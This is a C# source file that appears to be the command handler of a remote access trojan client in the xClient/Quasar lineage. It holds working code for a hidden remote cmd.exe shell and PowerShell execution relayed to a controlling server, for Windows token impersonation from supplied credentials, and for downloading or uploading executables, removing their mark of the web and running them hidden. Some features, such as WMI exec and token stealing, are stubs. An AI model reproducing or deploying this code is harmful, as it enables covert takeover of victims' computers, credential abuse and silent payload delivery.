using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Security;
using System.Security.Principal;
using System.Threading;
using System.Windows.Forms;
using xClient.Core.Helper;
using xClient.Core.Data;
using xClient.Core.Networking;
using xClient.Core.Utilities;
using System.Runtime.InteropServices;

namespace xClient.Core.Commands
{
    /* THIS PARTIAL CLASS SHOULD CONTAIN MISCELLANEOUS METHODS. */
    public static partial class CommandHandler
    {
        public static void HandleGetPowerPick(Packets.ServerPackets.GetPowerPick command, Client client)
        {
            string results;
            bool isError = false;
            try
            {
                results = PowerPickHelper.RunCommand(command.Command);
            }
            catch (Exception e)
            {
                results = e.Message;
                isError = true;
            }
            new Packets.ClientPackets.GetPowerPick(results, isError).Execute(client);
        }
        public static void HandleDoShellImpersonate(Packets.ServerPackets.DoShellExecute command, Client client)
        {
            new Thread (() =>
            {
                if (impersonate)
                {

                    if (command.Command != "exit" && _impShell == null)
                    {
                        _impShell = new Process();
                        _impShell.StartInfo.UseShellExecute = false;
                        _impShell.StartInfo.RedirectStandardOutput = true;
                        _impShell.StartInfo.RedirectStandardError = true;
                        _impShell.StartInfo.RedirectStandardInput = true;
                        //_impShell.StartInfo.UserName = "Administrator";
                        //_impShell.StartInfo.Password = (pass);
                        //_impShell.StartInfo.Domain = "";
                        _impShell.StartInfo.CreateNoWindow = true;
                        _impShell.StartInfo.FileName = "cmd.exe";
                        _impShell.StartInfo.Arguments = "/K " + command.Command;
                        _impShell.OutputDataReceived += (s,e)=>p_OutputDataReceived(s,e,client);
                        _impShell.ErrorDataReceived += (s,e)=>p_ErrorDataReceived(s,e,client);
                        _impShell.Start();
                        _impShell.BeginOutputReadLine();
                        _impShell.BeginErrorReadLine();

                    }
                    else if (command.Command != "exit" && _impShell != null)
                    {
                        _impShell.StandardInput.WriteLine(command.Command);
                    }
                    else if (command.Command == "exit")
                    {
                        _impShell.Close();
                        _impShell = null;
                    }
                     if (impersonate)
                     {
                        WindowsAPIHelper.RevertToSelf();
                     }
                }


            }).Start();
            //Start to implement own shell that supports impersonation.
        }
        static void p_OutputDataReceived(object sender, DataReceivedEventArgs e, Client c)
        {
            string result = e.Data;
            new xClient.Core.Packets.ClientPackets.DoShellExecuteResponse(result,true,false).Execute(c);
        }
        static void p_ErrorDataReceived(object sender, DataReceivedEventArgs e, Client c)
        {
            string error = e.Data;
            new xClient.Core.Packets.ClientPackets.DoShellExecuteResponse(error, true, true).Execute(c);
        }
        public static void HandleDoEnableImpersonation(Packets.ServerPackets.DoEnableImpersonation command, Client client)
        {
                impersonate = command.impersonate;
                impersonatedUser = command.user;
        }
        public static void HandleDoChangeToken(Packets.ServerPackets.GetChangeToken command, Client client)
        {
            ImpersonationSafeHandle token;
            string guid = Guid.NewGuid().ToString();
            if (command.technique == "steal")
            {
                try
                {
                    //TokenContextHelper.stealToken(ref token, SecurityImpersonate, ref duplicateToken, command.processID);
                    //WindowsAPIHelper.SetThreadToken(IntPtr.Zero, duplicateToken);
                }
                catch
                {
                    //new xClient.Core.Packets.ClientPackets.GetChangeToken(false, null).Execute(client);
                }
            }
            else if (command.technique == "make")
            {
                try
                {
                    string domain = "";
                    if(string.IsNullOrEmpty(command.domain))
                    {;
                        domain = Environment.MachineName;
                    }
                    else
                    {
                        domain = command.domain;
                    }
                    token = TokenContextHelper.makeToken(command.password, command.username, domain);
                    new xClient.Core.Packets.ClientPackets.GetChangeToken(true, domain + "\\" + command.username, guid).Execute(client);
                    //Will this cause issues with High Integ/Med Integ tokens?
                    impersonatedUsers.Add(guid, token);

                    //Need to do manual cleanup later?
                    GC.KeepAlive(token);
                }
                catch
                {
                    //new xClient.Core.Packets.ClientPackets.GetChangeToken(false, null).Execute(client);
                    MessageBox.Show("failed");
                }
            }
            else if (command.technique == "revToSelf")
            {
                WindowsAPIHelper.RevertToSelf();
            }
        }
        public static void HandleDoWMIExec(Packets.ServerPackets.DoWMIExec command, Client client)
        {
            //ManagementClass mc = new ManagementClass(command.domain, command.command);
        }
        public static void HandleDoDownloadAndExecute(Packets.ServerPackets.DoDownloadAndExecute command,
            Client client)
        {
            new Packets.ClientPackets.SetStatus("Downloading file...").Execute(client);

            new Thread(() =>
            {
                string tempFile = FileHelper.GetTempFilePath(".exe");

                try
                {
                    using (WebClient c = new WebClient())
                    {
                        c.Proxy = null;
                        c.DownloadFile(command.URL, tempFile);
                    }
                }
                catch
                {
                    new Packets.ClientPackets.SetStatus("Download failed!").Execute(client);
                    return;
                }

                new Packets.ClientPackets.SetStatus("Downloaded File!").Execute(client);

                try
                {
                    FileHelper.DeleteZoneIdentifier(tempFile);

                    var bytes = File.ReadAllBytes(tempFile);
                    if (!FileHelper.IsValidExecuteableFile(bytes))
                        throw new Exception("no pe file");

                    ProcessStartInfo startInfo = new ProcessStartInfo();
                    if (command.RunHidden)
                    {
                        startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                        startInfo.CreateNoWindow = true;
                    }
                    startInfo.UseShellExecute = false;
                    startInfo.FileName = tempFile;
                    Process.Start(startInfo);
                }
                catch
                {
                    NativeMethods.DeleteFile(tempFile);
                    new Packets.ClientPackets.SetStatus("Execution failed!").Execute(client);
                    return;
                }

                new Packets.ClientPackets.SetStatus("Executed File!").Execute(client);
            }).Start();
        }

        public static void HandleDoUploadAndExecute(Packets.ServerPackets.DoUploadAndExecute command, Client client)
        {
            if (!_renamedFiles.ContainsKey(command.ID))
                _renamedFiles.Add(command.ID, FileHelper.GetTempFilePath(Path.GetExtension(command.FileName)));

            string filePath = _renamedFiles[command.ID];

            try
            {
                if (command.CurrentBlock == 0 && Path.GetExtension(filePath) == ".exe" && !FileHelper.IsValidExecuteableFile(command.Block))
                    throw new Exception("No executable file");

                FileSplit destFile = new FileSplit(filePath);
                if (!destFile.AppendBlock(command.Block, command.CurrentBlock))
                    throw new Exception(destFile.LastError);

                if ((command.CurrentBlock + 1) == command.MaxBlocks) // execute
                {
                    if (_renamedFiles.ContainsKey(command.ID))
                        _renamedFiles.Remove(command.ID);

                    FileHelper.DeleteZoneIdentifier(filePath);

                    ProcessStartInfo startInfo = new ProcessStartInfo();
                    if (command.RunHidden)
                    {
                        startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                        startInfo.CreateNoWindow = true;
                    }
                    startInfo.UseShellExecute = false;
                    startInfo.FileName = filePath;
                    Process.Start(startInfo);

                    new Packets.ClientPackets.SetStatus("Executed File!").Execute(client);
                }
            }
            catch (Exception ex)
            {
                if (_renamedFiles.ContainsKey(command.ID))
                    _renamedFiles.Remove(command.ID);
                NativeMethods.DeleteFile(filePath);
                new Packets.ClientPackets.SetStatus(string.Format("Execution failed: {0}", ex.Message)).Execute(client);
            }
        }

        public static void HandleDoVisitWebsite(Packets.ServerPackets.DoVisitWebsite command, Client client)
        {
            string url = command.URL;

            if (!url.StartsWith("http"))
                url = "http://" + url;

            if (Uri.IsWellFormedUriString(url, UriKind.RelativeOrAbsolute))
            {
                if (!command.Hidden)
                    Process.Start(url);
                else
                {
                    try
                    {
                        HttpWebRequest request = (HttpWebRequest)HttpWebRequest.Create(url);
                        request.UserAgent =
                            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A";
                        request.AllowAutoRedirect = true;
                        request.Timeout = 10000;
                        request.Method = "GET";

                        using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
                        {
                        }
                    }
                    catch
                    {
                    }
                }

                new Packets.ClientPackets.SetStatus("Visited Website").Execute(client);
            }
        }

        public static void HandleDoShowMessageBox(Packets.ServerPackets.DoShowMessageBox command, Client client)
        {
            new Thread(() =>
            {
                MessageBox.Show(command.Text, command.Caption,
                    (MessageBoxButtons)Enum.Parse(typeof(MessageBoxButtons), command.MessageboxButton),
                    (MessageBoxIcon)Enum.Parse(typeof(MessageBoxIcon), command.MessageboxIcon),
                    MessageBoxDefaultButton.Button1, MessageBoxOptions.DefaultDesktopOnly);
            }).Start();

            new Packets.ClientPackets.SetStatus("Showed Messagebox").Execute(client);
        }
        public static void HandleDoStartChat(Packets.ServerPackets.DoStartChat command, Client client)
        {
            //Start Chat Window
                //Open Chat Box, start chat
                Forms.FrmAgentChat agentChat = new Forms.FrmAgentChat(client);
            new Thread(() =>
            {
                Application.Run(agentChat);
            }).Start();
        }

        public static void HandleGetMessages(Packets.ServerPackets.GetMessage command, Client client)
        {
            var agentChat = (Forms.FrmAgentChat)Application.OpenForms["FrmAgentChat"];
            if (agentChat != null)
            {
                agentChat.AddMessage(command.Message + "\r\n", "Server");
            }
        }

        public static void HandleGetStopChat(Packets.ServerPackets.GetStopChatAgent command, Client client)
        {
            //Find open AgentChat window using linq.
            var agentChat = (Forms.FrmAgentChat)Application.OpenForms["FrmAgentChat"];
            if (agentChat != null)
            {
                agentChat.AddMessage(" has left the chat, please close the window", "Agent");
            }
        }
    }
}